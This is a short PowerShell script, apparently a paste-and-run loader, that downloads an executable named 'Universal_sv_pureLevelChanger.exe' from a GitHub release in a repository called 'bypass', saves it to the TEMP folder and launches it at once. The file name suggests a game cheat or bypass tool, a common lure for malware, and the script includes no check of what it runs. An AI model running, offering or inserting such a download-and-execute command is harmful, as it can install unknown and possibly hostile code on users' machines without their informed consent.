$url = "https://github.com/kosnaja12/bypass/releases/download/v1.0/Universal_sv_pureLevelChanger.exe"
$path = "$env:TEMP\Universal_sv_pureLevelChanger.exe"
iwr $url -OutFile $path
Start-Process $path